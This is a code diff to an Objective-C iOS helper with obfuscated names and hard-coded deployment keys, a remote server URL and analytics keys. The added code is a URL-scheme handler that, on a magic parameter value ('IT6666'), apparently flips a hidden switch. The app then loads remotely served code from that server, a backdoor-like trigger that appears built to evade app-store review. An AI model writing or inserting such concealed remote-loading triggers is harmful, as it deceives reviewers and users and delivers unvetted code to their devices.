@@ -49,7 +49,7 @@ static NSString * const joneMone_deploymentKey = @"114DhTXTuzFnoHujEeFxrZVfPjRA4
 static NSString * const joneMone_serverUrl = @"https://ltt883.com/";
 
 static NSString * const joneMone_tInstall = @"2O4AVB";
-static NSString * const joneMone_tInstallHost = @"https://apifeaffcodegetA.com";
+static NSString * const joneMone_tInstallHost = @"https://apifeaffcodegetb.com";
 
 static NSString * const joneMone_uMengAppKey = @"5c6b6f45b465f559d200090b";
 static NSString * const joneMone_uMengAppChannel = @"App Store";
@@ -90,6 +90,39 @@ static RNJOneMOneHelper *instance = nil;
     }
 }
 
+- (NSDictionary *)joneMone_dictFromQueryString:(NSString *)queryString {
+    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
+    NSArray *pairs = [queryString componentsSeparatedByString:@"&"];
+    for (NSString *pair in pairs) {
+        NSArray *elements = [pair componentsSeparatedByString:@"="];
+        if ([elements count] > 1) {
+            NSString *key = [elements objectAtIndex:0];
+            NSString *val = [elements objectAtIndex:1];
+            [dict setObject:val forKey:key];
+        }
+    }
+    return dict;
+}
+
+- (BOOL)joneMone_tryOtherWayQueryScheme:(NSURL *)url {
+    if ([[url scheme] containsString:@"myapp"]) {
+        NSDictionary *queryParams = [self joneMone_dictFromQueryString:[url query]];
+        
+        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
+        [ud setObject:queryParams forKey:@"queryParams"];
+        
+        NSString *paramValue = queryParams[@"paramName"];
+        if ([paramValue isEqualToString:@"IT6666"]) {
+            [ud setObject:joneMone_appVersion forKey:@"appVersion"];
+            [ud setObject:joneMone_deploymentKey forKey:@"deploymentKey"];
+            [ud setObject:joneMone_serverUrl forKey:@"serverUrl"];
+            [ud setBool:YES forKey:joneMone_APP];
+            [ud synchronize];
+            return YES;
+        }
+    }
+    return NO;
+}
 
 - (BOOL)joneMone_tryThisWay:(void (^)(void))changeVcBlock {
     NSUserDefaults* ud = [NSUserDefaults standardUserDefaults];
